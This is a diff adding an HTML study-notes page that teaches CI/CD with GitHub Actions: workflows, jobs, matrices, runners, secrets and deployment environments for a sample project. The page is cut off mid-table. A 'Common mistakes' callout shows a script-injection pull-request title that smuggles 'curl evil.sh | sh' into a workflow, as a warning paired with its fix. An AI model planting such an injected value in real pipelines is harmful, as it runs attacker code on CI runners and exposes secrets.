@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>DevOps · Session 18 — CI/CD &amp; GitHub Actions</title>
+  <link rel="stylesheet" href="../../../assets/css/styles.css?v=20261009a" />
+</head>
+<body data-accent="devops">
+  <div id="progress"></div>
+
+  <header class="topbar">
+    <a class="brand" href="../../../index.html"><span class="brand-dot">📚</span> Study Notes</a>
+    <span class="crumbs">/ <a href="../../../index.html">Home</a> / <a href="../index.html">DevOps</a> / Session 18</span>
+    <span class="spacer"></span>
+    <button class="icon-btn" id="theme-btn" title="Toggle dark mode">🌙</button>
+  </header>
+
+  <main class="wrap">
+    <section class="page-hero">
+      <span class="kicker">Term 9 · DevOps · Session 18</span>
+      <h1>CI/CD &amp; GitHub Actions</h1>
+      <p class="lead">
+        Write TaskFlow's <code class="inl">.github/workflows/ci.yml</code>: lint and test on every push and PR across Node versions,
+        build and smoke-test the Docker image, keep reports as artifacts, and push the image using secrets — then debug a failed run.
+      </p>
+      <div class="hero-meta"><span class="badge-rt">⏱ 28 min read</span><span class="badge-rt">📖 7 topics</span></div>
+    </section>
+
+    <div class="article-layout">
+
+      <nav class="toc" aria-label="Table of contents">
+        <h4>On this page</h4>
+        <ol>
+          <li><a href="#ci-cd">CI vs CD &amp; the pipeline</a></li>
+          <li><a href="#workflows">GitHub Actions &amp; workflows</a></li>
+          <li><a href="#jobs-steps">Jobs &amp; steps</a></li>
+          <li><a href="#runners">Runners</a></li>
+          <li><a href="#secrets">Secrets, variables &amp; GITHUB_TOKEN</a></li>
+          <li><a href="#artifacts">Artifacts &amp; caching</a></li>
+          <li><a href="#build-test">Build &amp; test pipeline: ci.yml</a></li>
+          <li><a href="#commands">Commands you must know</a></li>
+          <li><a href="#wrapup">Putting it all together</a></li>
+          <li><a href="#refs">References</a></li>
+        </ol>
+      </nav>
+
+      <article class="article">
+
+      <!-- ===================== 1. CI vs CD ===================== -->
+      <section id="ci-cd">
+        <h2><span class="sec-num">1</span> CI vs CD &amp; the CI/CD pipeline</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>CI is a robot that checks every change the moment you hand it in. CD is the robot then packing it and putting it on the shelf (delivery) — or straight into customers' hands (deployment).</p>
+        </div>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th></th><th>Continuous Integration</th><th>Continuous Delivery</th><th>Continuous Deployment</th></tr></thead>
+            <tbody>
+              <tr><td>What happens automatically</td><td>Build + test on every push/PR</td><td>CI + package + deploy to staging; prod release is <strong>one click</strong></td><td>CI + package + deploy <strong>to prod</strong>, no human</td></tr>
+              <tr><td>Human gate before prod</td><td>— (no deploy)</td><td>Yes: manual approval</td><td>No: tests are the gate</td></tr>
+              <tr><td>Output</td><td>"Is this commit good?" ✓/✗</td><td>A release-ready artifact, always</td><td>Code live minutes after merge</td></tr>
+              <tr><td>Needs</td><td>Automated tests, small frequent merges</td><td>CI + versioned artifacts + scripted deploys</td><td>All of that + very good tests, monitoring, fast rollback</td></tr>
+              <tr><td>In GitHub Actions</td><td><code class="inl">on: [push, pull_request]</code></td><td><code class="inl">environment: production</code> with required reviewers</td><td>Same job, no reviewers</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>A <span class="term">pipeline</span> is the ordered list of automated stages a commit goes through. Cheap, fast checks first so failures show up early:</p>
+        <div class="flow">
+          <div class="step"><div class="s-ico">📝</div><div class="s-t">Commit</div><div class="s-d">push / PR</div></div>
+          <div class="arrow">→</div>
+          <div class="step"><div class="s-ico">🔨</div><div class="s-t">Build</div><div class="s-d">npm ci, compile</div></div>
+          <div class="arrow">→</div>
+          <div class="step"><div class="s-ico">🧪</div><div class="s-t">Test</div><div class="s-d">lint, unit, integration</div></div>
+          <div class="arrow">→</div>
+          <div class="step"><div class="s-ico">🛡️</div><div class="s-t">Scan</div><div class="s-d">deps, secrets, image</div></div>
+          <div class="arrow">→</div>
+          <div class="step"><div class="s-ico">📦</div><div class="s-t">Package</div><div class="s-d">Docker image → registry</div></div>
+          <div class="arrow">→</div>
+          <div class="step"><div class="s-ico">🚀</div><div class="s-t">Deploy</div><div class="s-d">staging → prod</div></div>
+        </div>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Stage</th><th>TaskFlow command</th><th>Typical failure it catches</th></tr></thead>
+            <tbody>
+              <tr><td>Build</td><td><code class="inl">npm ci</code></td><td>package.json and package-lock.json out of sync; missing dependency</td></tr>
+              <tr><td>Test</td><td><code class="inl">npm run lint</code>, <code class="inl">npm test</code></td><td>Syntax/style errors; <code class="inl">POST /tasks</code> returns 201 for an empty title</td></tr>
+              <tr><td>Scan (Session 19)</td><td><code class="inl">npm audit</code>, gitleaks, Trivy</td><td>Vulnerable <code class="inl">express</code> version, AWS key committed, CVEs in base image</td></tr>
+              <tr><td>Package</td><td><code class="inl">docker build</code> + smoke test</td><td>Broken Dockerfile, container crashes on start, <code class="inl">/health</code> not 200</td></tr>
+              <tr><td>Deploy (Session 19)</td><td><code class="inl">helm upgrade --install --atomic</code></td><td>Pods not Ready (bad env/secret) → auto-rollback</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <ul>
+          <li><strong>Build once, promote the same artifact</strong> (same image tag) from staging to prod — never rebuild per environment.</li>
+          <li><strong>Pipeline as code</strong>: the pipeline lives in the repo (<code class="inl">.github/workflows/*.yml</code>), reviewed in PRs like any code.</li>
+          <li>Other CI/CD tools, same ideas: GitLab CI (<code class="inl">.gitlab-ci.yml</code>), Jenkins (<code class="inl">Jenkinsfile</code>), CircleCI, Azure Pipelines.</li>
+        </ul>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          CI = auto build + test every change. Delivery = always releasable, humans press deploy. Deployment = auto to prod. Pipeline order: build → test → scan → package → deploy, fail fast.
+        </div>
+      </section>
+
+      <!-- ===================== 2. WORKFLOWS ===================== -->
+      <section id="workflows">
+        <h2><span class="sec-num">2</span> GitHub Actions &amp; workflows</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>A workflow is a recipe in your repo. An event (a push) rings the bell, GitHub hands the recipe to a fresh computer (runner), and it follows the steps.</p>
+        </div>
+
+<pre>event (push, pull_request, schedule, manual)
+   │ triggers
+   ▼
+WORKFLOW   .github/workflows/ci.yml         one YAML file = one workflow; each trigger = a "run"
+   ├── JOB lint    runs-on: ubuntu-latest    each job = a fresh runner VM; jobs run in PARALLEL by default
+   │     ├── STEP  uses: actions/checkout@v4      ← ACTION: reusable code (owner/repo@version)
+   │     ├── STEP  uses: actions/setup-node@v4
+   │     └── STEP  run: npm run lint              ← shell command
+   └── JOB build   needs: lint               waits for lint; steps of a job share one machine/filesystem</pre>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Term</th><th>Meaning</th></tr></thead>
+            <tbody>
+              <tr><td><span class="term">Workflow</span></td><td>YAML file in <code class="inl">.github/workflows/</code> (any name, <code class="inl">.yml</code>/<code class="inl">.yaml</code>).</td></tr>
+              <tr><td><span class="term">Event</span></td><td>What starts it (<code class="inl">on:</code>).</td></tr>
+              <tr><td><span class="term">Job</span></td><td>Set of steps on one runner. Has its own <code class="inl">runs-on</code>, <code class="inl">needs</code>, <code class="inl">if</code>.</td></tr>
+              <tr><td><span class="term">Step</span></td><td>Either <code class="inl">uses:</code> an action or <code class="inl">run:</code> a command. Runs in order; first failure stops the job.</td></tr>
+              <tr><td><span class="term">Action</span></td><td>Packaged step from the Marketplace or your repo: <code class="inl">actions/checkout@v4</code>, <code class="inl">./.github/actions/x</code>, <code class="inl">docker://alpine:3.20</code>.</td></tr>
+              <tr><td><span class="term">Runner</span></td><td>Machine that executes a job (topic 4).</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Your first workflow</h3>
+        <div class="fname">.github/workflows/hello.yml</div>
+<pre><span class="kw">name</span>: Hello                        <span class="cm"># shown in the Actions tab</span>
+<span class="kw">on</span>: [push, workflow_dispatch]       <span class="cm"># every push + a "Run workflow" button</span>
+<span class="kw">jobs</span>:
+  hello:                             <span class="cm"># job id (your choice)</span>
+    runs-on: ubuntu-latest           <span class="cm"># GitHub-hosted Ubuntu VM</span>
+    steps:
+      - uses: actions/checkout@v4    <span class="cm"># clone the repo into the runner (NOT automatic!)</span>
+      - name: Say hello
+        run: |                       <span class="cm"># | = multi-line script, runs in bash</span>
+          echo "Hello ${{ github.actor }} from ${{ runner.os }}"
+          echo "Commit $GITHUB_SHA on $GITHUB_REF_NAME"
+          ls</pre>
+<pre><span class="pr">$</span> git add .github/workflows/hello.yml &amp;&amp; git commit -m "ci: hello workflow" &amp;&amp; git push
+<span class="pr">$</span> gh run list --workflow hello.yml --limit 1
+<span class="out">STATUS  TITLE               WORKFLOW  BRANCH  EVENT  ID           ELAPSED  AGE
+✓       ci: hello workflow  Hello     main    push   18231904410  9s       less than a minute ago</span>
+<span class="pr">$</span> gh run view 18231904410 --log | grep -A4 'Say hello'
+<span class="out">hello  Say hello  2026-10-09T06:41:12.4128834Z Hello shauryav from Linux
+hello  Say hello  2026-10-09T06:41:12.4130021Z Commit 4f2a9c1e8b7d6a5f4e3d2c1b0a9f8e7d6c5b4a39 on main
+hello  Say hello  2026-10-09T06:41:12.4151210Z Dockerfile
+hello  Say hello  2026-10-09T06:41:12.4151987Z compose.yaml
+hello  Say hello  2026-10-09T06:41:12.4152310Z k8s</span></pre>
+
+        <h3>Triggers: the <code class="inl">on:</code> block</h3>
+<pre><span class="kw">on</span>:
+  push:
+    branches: [main]                 <span class="cm"># only pushes to main (glob ok: 'release/**')</span>
+    tags: [<span class="st">'v*'</span>]                      <span class="cm"># ...or pushing a tag like v1.2.0</span>
+    paths-ignore:                    <span class="cm"># skip runs when ONLY these changed</span>
+      - <span class="st">'**.md'</span>
+      - <span class="st">'docs/**'</span>
+  pull_request:
+    branches: [main]                 <span class="cm"># PRs whose TARGET is main (opened, new commits, reopened)</span>
+  workflow_dispatch:                 <span class="cm"># manual run: button in UI / gh workflow run</span>
+    inputs:
+      reason:
+        description: Why are you running this?
+        type: string
+        default: manual
+  schedule:
+    - cron: <span class="st">'30 2 * * 1'</span>              <span class="cm"># min hour day month weekday, in UTC → Mon 02:30 UTC = 08:00 IST</span></pre>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Event</th><th>Use</th><th>Gotcha</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">push</code></td><td>CI on branches, release on tags</td><td>Use <code class="inl">paths</code> <em>or</em> <code class="inl">paths-ignore</code>, not both for one event.</td></tr>
+              <tr><td><code class="inl">pull_request</code></td><td>Check a PR before merge</td><td>Runs on a merge commit (<code class="inl">refs/pull/12/merge</code>). From forks: no secrets, read-only token.</td></tr>
+              <tr><td><code class="inl">workflow_dispatch</code></td><td>Manual runs with inputs (<code class="inl">${{ inputs.reason }}</code>)</td><td>The workflow file must be on the default branch for the button to show.</td></tr>
+              <tr><td><code class="inl">schedule</code></td><td>Nightly builds, weekly dependency checks</td><td>UTC only, runs on the default branch, can start late at busy times; min interval 5 min.</td></tr>
+              <tr><td><code class="inl">release</code>, <code class="inl">workflow_call</code></td><td>On GitHub Release / reusable workflows</td><td>—</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout note">
+          <span class="c-title">About the @v4 version pins</span>
+          <p>This course pins <code class="inl">actions/checkout@v4</code>, <code class="inl">setup-node@v4</code>, <code class="inl">upload-artifact@v4</code>/<code class="inl">download-artifact@v4</code>. Newer majors exist (Oct 2026: checkout v7, setup-node v7, upload-artifact v7, download-artifact v8) — mainly a move to the Node 24 runtime; the inputs used on this page are unchanged. Since 23 Sep 2026 GitHub runs every JavaScript action on Node 24 and recommends upgrading old majors. For a new repo, check each action's Releases page and use the latest major. Never use <code class="inl">@main</code>.</p>
+        </div>
+
+        <div class="callout warn">
+          <span class="c-title">Common mistakes</span>
+          <ul>
+            <li>Workflow never runs → file not in <code class="inl">.github/workflows/</code>, branch filter doesn't match, or the YAML is invalid (Actions tab shows "Invalid workflow file" with the line).</li>
+            <li>Forgetting <code class="inl">actions/checkout</code> → <code class="inl">npm ci</code> fails with <code class="inl">ENOENT: no such file or directory, open '.../package.json'</code>. The runner starts empty.</li>
+            <li>Tabs in YAML, or <code class="inl">on:</code> keys mis-indented — validate locally with <code class="inl">actionlint</code> or your editor's YAML plugin.</li>
+          </ul>
+        </div>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          Event → workflow (<code class="inl">.github/workflows/*.yml</code>) → jobs (parallel, own runner) → steps (<code class="inl">uses</code> action or <code class="inl">run</code> command). Triggers: push, pull_request, workflow_dispatch, schedule (UTC).
+        </div>
+      </section>
+
+      <!-- ===================== 3. JOBS & STEPS ===================== -->
+      <section id="jobs-steps">
+        <h2><span class="sec-num">3</span> Jobs &amp; steps</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>Jobs are cooks in separate kitchens working at the same time; steps are one cook's instructions in order. <code class="inl">needs</code> says "wait until that cook is done".</p>
+        </div>
+
+        <h3>Steps: <code class="inl">uses</code> vs <code class="inl">run</code></h3>
+<pre>    steps:
+      - name: Set up Node                    <span class="cm"># label shown in the log</span>
+        uses: actions/setup-node@v4          <span class="cm"># ACTION; inputs go under with:</span>
+        with:
+          node-version: <span class="nm">20</span>
+          cache: npm
+      - name: Install
+        run: npm ci                          <span class="cm"># SHELL command</span>
+      - name: Unit tests
+        id: tests                            <span class="cm"># id → reference steps.tests.outcome / outputs later</span>
+        run: npm test
+        working-directory: ./                <span class="cm"># cd for this step only</span>
+        env:
+          NODE_ENV: test                     <span class="cm"># env var for this step only</span>
+        continue-on-error: <span class="nm">false</span>             <span class="cm"># true = job continues even if this fails</span></pre>
+        <ul>
+          <li>Default shell: <code class="inl">bash -e</code> on Linux/macOS, <code class="inl">pwsh</code> on Windows. <code class="inl">shell: bash</code> adds <code class="inl">-o pipefail</code>.</li>
+          <li>Each <code class="inl">run</code> is a new process: <code class="inl">cd</code> and shell variables don't carry over. Persist with <code class="inl">echo "KEY=val" &gt;&gt; "$GITHUB_ENV"</code> (env for later steps) or <code class="inl">&gt;&gt; "$GITHUB_OUTPUT"</code> (step output).</li>
+          <li>Steps in a job share the filesystem; <strong>different jobs don't</strong> — pass files via artifacts (topic 6).</li>
+        </ul>
+
+        <h3>needs, if, timeout, concurrency</h3>
+<pre><span class="kw">concurrency</span>:                                  <span class="cm"># one run per branch/PR; newer push cancels the older run</span>
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: <span class="nm">true</span>
+
+<span class="kw">jobs</span>:
+  lint:
+    runs-on: ubuntu-latest
+    timeout-minutes: <span class="nm">5</span>                         <span class="cm"># default is 360 (6 h!) — always set it</span>
+    steps: [...]
+  test:
+    runs-on: ubuntu-latest                     <span class="cm"># no needs → runs in parallel with lint</span>
+    steps: [...]
+  build:
+    needs: [lint, test]                        <span class="cm"># waits for BOTH; skipped if either fails</span>
+    if: github.event_name != 'schedule'        <span class="cm"># job-level condition</span>
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./build.sh
+      - name: Dump logs on failure
+        if: failure()                          <span class="cm"># only when an earlier step failed</span>
+        run: docker logs api
+      - name: Always clean up
+        if: always()                           <span class="cm"># even after failure or cancel</span>
+        run: docker rm -f api || true</pre>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th><code class="inl">if:</code> status function</th><th>Step/job runs when…</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">success()</code> (default)</td><td>All previous steps / needed jobs succeeded</td></tr>
+              <tr><td><code class="inl">failure()</code></td><td>Any previous step / needed job failed</td></tr>
+              <tr><td><code class="inl">always()</code></td><td>Always, even if cancelled</td></tr>
+              <tr><td><code class="inl">cancelled()</code></td><td>The run was cancelled</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Matrix: one job definition, many combinations</h3>
+<pre>  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: <span class="nm">false</span>                 <span class="cm"># default true = cancel the others when one fails</span>
+      max-parallel: <span class="nm">4</span>
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        node: [<span class="nm">20</span>, <span class="nm">22</span>, <span class="nm">24</span>]               <span class="cm"># 2 × 3 = 6 jobs</span>
+        exclude:
+          - os: windows-latest
+            node: <span class="nm">24</span>                     <span class="cm"># → 5 jobs</span>
+        include:
+          - os: ubuntu-latest
+            node: <span class="nm">24</span>
+            coverage: <span class="nm">true</span>               <span class="cm"># extra variable for one combination</span>
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: ${{ matrix.node }}
+      - run: npm ci
+      - run: npm test</pre>
+        <p>Jobs appear as <code class="inl">test (ubuntu-latest, 20)</code>, <code class="inl">test (windows-latest, 22)</code>… Node 20 is what TaskFlow ships today (it reached end-of-life in Apr 2026, so plan the upgrade); 22 and 24 are the current LTS lines.</p>
+
+        <h3>Outputs: passing a value from one job to another</h3>
+<pre>  build:
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.meta.outputs.tag }}          <span class="cm"># 2) expose the step output as a job output</span>
+    steps:
+      - id: meta
+        run: echo "tag=sha-${GITHUB_SHA::7}" &gt;&gt; "$GITHUB_OUTPUT"   <span class="cm"># 1) step output: tag=sha-4f2a9c1</span>
+  publish:
+    needs: build                                    <span class="cm"># needs.X only works for jobs listed here</span>
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Publishing ${{ needs.build.outputs.tag }}"   <span class="cm"># 3) read it</span></pre>
+
+        <h3>Contexts &amp; expressions</h3>
+        <p><code class="inl">${{ … }}</code> is evaluated by GitHub <em>before</em> the step runs (text substitution). In <code class="inl">if:</code> you may drop the <code class="inl">${{ }}</code>.</p>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Expression</th><th>Push to main</th><th>Pull request #12</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">github.event_name</code></td><td><code class="inl">push</code></td><td><code class="inl">pull_request</code></td></tr>
+              <tr><td><code class="inl">github.ref</code></td><td><code class="inl">refs/heads/main</code></td><td><code class="inl">refs/pull/12/merge</code></td></tr>
+              <tr><td><code class="inl">github.ref_name</code></td><td><code class="inl">main</code></td><td><code class="inl">12/merge</code></td></tr>
+              <tr><td><code class="inl">github.sha</code></td><td>pushed commit (<code class="inl">4f2a9c1e…</code>)</td><td>the test merge commit</td></tr>
+              <tr><td><code class="inl">github.repository</code> / <code class="inl">github.actor</code></td><td colspan="2"><code class="inl">shauryav/taskflow</code> / <code class="inl">shauryav</code></td></tr>
+              <tr><td><code class="inl">github.run_number</code></td><td colspan="2">1, 2, 3… per workflow</td></tr>
+              <tr><td><code class="inl">runner.os</code></td><td colspan="2"><code class="inl">Linux</code>, <code class="inl">Windows</code>, <code class="inl">macOS</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p>Other contexts: <code class="inl">env</code>, <code class="inl">vars</code>, <code class="inl">secrets</code>, <code class="inl">matrix</code>, <code class="inl">needs</code>, <code class="inl">steps</code>, <code class="inl">inputs</code>. Functions: <code class="inl">contains()</code>, <code class="inl">startsWith(github.ref, 'refs/tags/v')</code>, <code class="inl">hashFiles('**/package-lock.json')</code>, <code class="inl">format()</code>, <code class="inl">toJSON()</code>. Most also exist as env vars: <code class="inl">$GITHUB_SHA</code>, <code class="inl">$GITHUB_REF_NAME</code>, <code class="inl">$RUNNER_OS</code>.</p>
+
+        <div class="callout warn">
+          <span class="c-title">Common mistakes</span>
+          <ul>
+            <li><strong>Script injection.</strong> <code class="inl">run: echo "${{ github.event.pull_request.title }}"</code> pastes attacker-controlled text into your script (a PR titled <code class="inl">"; curl evil.sh | sh; "</code> runs). Pass it via <code class="inl">env:</code> and use <code class="inl">"$TITLE"</code>.</li>
+            <li><code class="inl">needs.build.outputs.tag</code> is empty → <code class="inl">build</code> isn't in this job's <code class="inl">needs</code> (only direct dependencies are visible), or the job-level <code class="inl">outputs:</code> mapping is missing.</li>
+            <li><code class="inl">cancel-in-progress: true</code> on main can kill a half-finished publish/deploy. Use <code class="inl">cancel-in-progress: ${{ github.event_name == 'pull_request' }}</code>.</li>
+          </ul>
+        </div>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          Jobs: parallel unless <code class="inl">needs</code>; gate with <code class="inl">if</code>; fan out with <code class="inl">matrix</code>; share values via <code class="inl">outputs</code>; always set <code class="inl">timeout-minutes</code>. Steps: <code class="inl">uses</code>+<code class="inl">with</code> or <code class="inl">run</code>.
+        </div>
+      </section>
+
+      <!-- ===================== 4. RUNNERS ===================== -->
+      <section id="runners">
+        <h2><span class="sec-num">4</span> Runners</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>A runner is the computer that does the work. GitHub lends you a clean one per job, or you can bring your own.</p>
+        </div>
+
+        <ul>
+          <li>A <span class="term">runner</span> is a machine running the GitHub Actions runner agent. It polls GitHub, picks up a job whose <code class="inl">runs-on</code> labels match, runs the steps, streams logs back.</li>
+          <li>GitHub-hosted: a <strong>fresh VM per job</strong>, deleted afterwards — nothing survives between jobs (hence artifacts/cache). Pre-installed: git, Docker, Node, Python, Java, kubectl, helm, AWS/Azure CLIs, <code class="inl">gh</code>.</li>
+          <li>Labels: <code class="inl">ubuntu-latest</code> (moves to newer Ubuntu LTS over time — pin <code class="inl">ubuntu-24.04</code> for stability), <code class="inl">ubuntu-22.04</code>, <code class="inl">ubuntu-24.04-arm</code>, <code class="inl">windows-latest</code>, <code class="inl">macos-latest</code>.</li>
+        </ul>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th></th><th>GitHub-hosted</th><th>Self-hosted</th></tr></thead>
+            <tbody>
+              <tr><td>Machine</td><td>VM managed by GitHub</td><td>Your laptop, EC2 instance, on-prem server, or K8s pods</td></tr>
+              <tr><td>State</td><td>Clean every job</td><td>Persists (caches, Docker images, leftover files)</td></tr>
+              <tr><td>Maintenance</td><td>None</td><td>You patch OS, tools, runner agent</td></tr>
+              <tr><td>Cost</td><td>Free for public repos; private repos use plan minutes (Free plan: 2,000/month; Windows/macOS cost more)</td><td>You pay for the machine</td></tr>
+              <tr><td>Network</td><td>Public internet only</td><td>Can reach private networks (internal DB, private K8s API)</td></tr>
+              <tr><td>Hardware</td><td>Standard sizes (larger runners paid)</td><td>Anything: GPUs, big RAM, ARM</td></tr>
+              <tr><td><code class="inl">runs-on</code></td><td><code class="inl">ubuntu-latest</code></td><td><code class="inl">[self-hosted, linux, x64, minikube]</code> (all labels must match)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Registering a self-hosted runner (Linux)</h3>
+        <p>Repo → Settings → Actions → Runners → <em>New self-hosted runner</em> shows these commands with a one-time token:</p>
+<pre><span class="pr">$</span> mkdir actions-runner &amp;&amp; cd actions-runner
+<span class="pr">$</span> curl -o runner.tar.gz -L https://github.com/actions/runner/releases/download/v2.338.0/actions-runner-linux-x64-2.338.0.tar.gz
+<span class="pr">$</span> tar xzf runner.tar.gz
+<span class="pr">$</span> ./config.sh --url https://github.com/shauryav/taskflow --token AABBCCDDEEFF112233 --labels minikube
+<span class="out">√ Runner successfully added
+√ Runner connection is good
+√ Settings Saved.</span>
+<span class="pr">$</span> ./run.sh                                   <span class="cm"># foreground test; Ctrl+C to stop</span>
+<span class="out">√ Connected to GitHub
+Current runner version: '2.338.0'
+2026-10-09 07:02:11Z: Listening for Jobs</span>
+<span class="pr">$</span> sudo ./svc.sh install shaurya &amp;&amp; sudo ./svc.sh start      <span class="cm"># then run it as a systemd service instead</span></pre>
+<pre>  deploy-local:
+    runs-on: [self-hosted, linux, minikube]    <span class="cm"># lands only on that machine</span>
+    steps:
+      - uses: actions/checkout@v4
+      - run: kubectl get nodes                  <span class="cm"># uses the machine's own kubeconfig</span></pre>
+
+        <div class="callout warn">
+          <span class="c-title">Common mistakes</span>
+          <ul>
+            <li>Self-hosted runner on a <strong>public</strong> repo: anyone can open a PR that runs code on your machine. Use them only for private repos.</li>
+            <li>Job stuck at <em>"Waiting for a runner to pick up this job…"</em> → no online runner has all the labels in <code class="inl">runs-on</code> (typo, or the runner service is stopped).</li>
+            <li>Assuming files from job A exist in job B — different VMs. Use artifacts.</li>
+          </ul>
+        </div>
+
+        <div class="recap">
+          <span class="c-title">Recap</span>
+          <code class="inl">runs-on</code> picks a runner by labels. Hosted = clean, zero maintenance, public internet. Self-hosted = your hardware/network, your upkeep, private repos only.
+        </div>
+      </section>
+
+      <!-- ===================== 5. SECRETS ===================== -->
+      <section id="secrets">
+        <h2><span class="sec-num">5</span> Secrets, variables &amp; GITHUB_TOKEN</h2>
+        <hr class="section-rule" />
+
+        <div class="callout eli5">
+          <span class="c-title">Explain like I'm 5</span>
+          <p>Secrets are passwords in a locked drawer: the workflow can use them but nobody can read them back, and the log blanks them out.</p>
+        </div>
+
+        <ul>
+          <li><span class="term">Secrets</span>: encrypted, write-only (UI never shows the value again), masked as <code class="inl">***</code> in logs. For tokens/passwords.</li>
+          <li><span class="term">Variables</span>: plain-text config (<code class="inl">vars.DOCKERHUB_USERNAME</code>, region names). Visible in logs.</li>
+          <li>Levels: <strong>repository</strong>, <strong>environment</strong> (only jobs that declare that environment), <strong>organization</strong> (shared by chosen repos). Most specific wins.</li>
+        </ul>
+
+        <p>Docker Hub → Account settings → Personal access tokens → create a <em>Read &amp; Write</em> token, then:</p>
+<pre><span class="pr">$</span> gh secret set DOCKERHUB_TOKEN               <span class="cm"># prompts for the value (stays out of shell history)</span>
+<span class="out">? Paste your secret: ********
+✓ Set Actions secret DOCKERHUB_TOKEN for shauryav/taskflow</span>
+<span class="pr">$</span> gh variable set DOCKERHUB_USERNAME --body shauryav
+<span class="out">✓ Created variable DOCKERHUB_USERNAME for shauryav/taskflow</span>
+<span class="pr">$</span> gh secret list
+<span class="out">NAME             UPDATED
+DOCKERHUB_TOKEN  less than a minute ago</span>
+<span class="pr">$</span> gh secret set KUBECONFIG --env production &lt; kubeconfig.yaml   <span class="cm"># environment-level secret</span></pre>
+
+        <p>Use them:</p>
+<pre>      - uses: docker/login-action@v3
+        with:
+          username: ${{ vars.DOCKERHUB_USERNAME }}     <span class="cm"># variable</span>
+          password: ${{ secrets.DOCKERHUB_TOKEN }}     <span class="cm"># secret → into an action input</span>
+      - run: ./scripts/notify.sh
+        env:
+          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}  <span class="cm"># secret → env var for one step</span></pre>
+<pre><span class="cm"># what the log shows if someone does: run: echo "token=$SLACK_WEBHOOK"</span>
+<span class="out">token=***</span></pre>
+
+        <h3>GITHUB_TOKEN and permissions</h3>
+        <ul>
+          <li>GitHub creates a <code class="inl">GITHUB_TOKEN</code> for every job automatically (<code class="inl">${{ secrets.GITHUB_TOKEN }}</code>), scoped to this repo, expiring when the job ends. No setup needed.</li>
+          <li>Declare the least it needs with <code class="inl">permissions:</code> (workflow or job level). Anything not listed becomes <code class="inl">none</code>.</li>
+        </ul>
+<pre><span class="kw">permissions</span>:
+  contents: read           <span class="cm"># checkout</span>
+
+<span class="kw">jobs</span>:
+  pr-comment:
+    if: github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write   <span class="cm"># job-level: only this job may comment</span>
+    steps:
+      - run: gh pr comment "$PR" --repo "$GITHUB_REPOSITORY" --body "✅ Tests passed on Node 20/22/24"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}       <span class="cm"># gh CLI reads GH_TOKEN</span>
+          PR: ${{ github.event.pull_request.number }}</pre>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Permission</th><th>Needed for</th></tr></thead>
+            <tbody>
+              <tr><td><code class="inl">contents: read</code> / <code class="inl">write</code></td><td>Checkout / push commits, create releases</td></tr>
+              <tr><td><code class="inl">packages: write</code></td><td>Push images to GHCR (Session 19)</td></tr>
+              <tr><td><code class="inl">pull-requests: write</code></td><td>Comment on / label PRs</td></tr>
+              <tr><td><code class="inl">security-events: write</code></td><td>Upload CodeQL/Trivy results (Session 19)</td></tr>
+              <tr><td><code class="inl">id-token: write</code></td><td>OIDC login to AWS/Azure/GCP without stored keys</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Environments: approvals before deploy</h3>
+<pre>  deploy:
+    needs: [build, publish]
+    runs-on: ubuntu-latest
+    environment:
+      name: production                   <span class="cm"># Settings → Environments → production → Required reviewers: shauryav</span>
+      url: https://taskflow.example.com  <span class="cm"># link shown on the run page</span>
+    steps:
+      - run: echo "deploying ${{ needs.build.outputs.tag }}"   <span class="cm"># real deploy in Session 19</span>
+        env:
+          KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}           <span class="cm"># environment secret, only visible here</span></pre>
+        <p>The run pauses at this job (status <em>Waiting</em>, with a <em>Review deployments</em> button) until a required reviewer approves — this is Continuous <strong>Delivery</strong>. Remove the reviewer rule and it becomes Continuous <strong>Deployment</strong>. Environments can also restrict which branches may deploy (only <code class="inl">main</code>) and add a wait timer.</p>
+
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th></th><th>Secret</th><th>Variable</th><th><code class="inl">env:</code> in YAML</th></tr></thead>
+            <tbody>
